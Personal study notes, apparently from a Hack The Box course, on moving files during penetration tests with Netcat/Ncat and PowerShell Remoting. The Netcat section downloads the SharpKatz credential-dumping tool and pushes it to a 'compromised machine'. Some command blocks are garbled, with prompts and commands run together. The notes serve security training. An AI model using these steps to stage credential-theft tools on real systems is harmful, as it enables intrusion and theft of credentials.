**Netcat (nc):**

- Netcat is a computer networking tool that is used for reading from and writing to network connections using TCP and UDP, **which means we can use it for File Transfers!**

**File Transfers w/ Netcat**

- Compromised machine - listening on port 8000.

```bash
victim@target:~$ # Example using Original Netcatvictim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

- Using our attack host, we will connect to the compromised machine over port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat.

Attack host sending file to compromised machine:

```bash
realCustampin@htb[/htb]$ wget -q <https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exerealCustampin@htb[/htb]$> # Example using Original NetcatrealCustampin@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

- The above example is sending the file to the compromised host via the old netcat

Using Ncat on our attacking host, we specify the —send-only parameter

```bash
realCustampin@htb[/htb]$ wget -q <https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exerealCustampin@htb[/htb]$> # Example using NcatrealCustampin@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

**Windows Powershell Transfers without HTTP, SMB, HTTPS**

- We can use Powershell Remoting, aka WinRM to perform file transfers.
- Powershell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions.
- By default, enabling powershell remoting creates both an HTTP and an HTTPS listener.
    - TCP/5985 for HTTP
    - TCP/5986 for HTTPS
- Requires admin privileges, member of the Remote Managment Users group, or have explicit permissions for Powershell Remoting.

**From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01:**

```powershell
PS C:\\htb> whoami

htb\\administrator

PS C:\\htb> hostname

DC01
```

```powershell
PS C:\\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Below we are assigning the $Session variable with DATABASE01: `PS C:\\htb> $Session = New-PSSession -ComputerName DATABASE01`

And now, we can use the Copy-Item cmdlet and can copy the data from our [Localhost](http://Localhost) to the DATABASE01 session: `PS C:\\htb> Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\`

Let’s try to copy an item over from DATABASE01 to [Localhost](http://Localhost): `PS C:\\htb> Copy-Item -Path "C:\\Users\\Administrator\\Desktop\\DATABASE.txt" -Destination C:\\ -FromSession $Session`

- `Active Directory Enumeration and Attacks` - Skills Assessments 1 & 2
- Throughout the `Pivoting, Tunnelling & Port Forwarding` module
- Throughout the `Attacking Enterprise Networks` module
- Throughout the `Shells & Payloads` module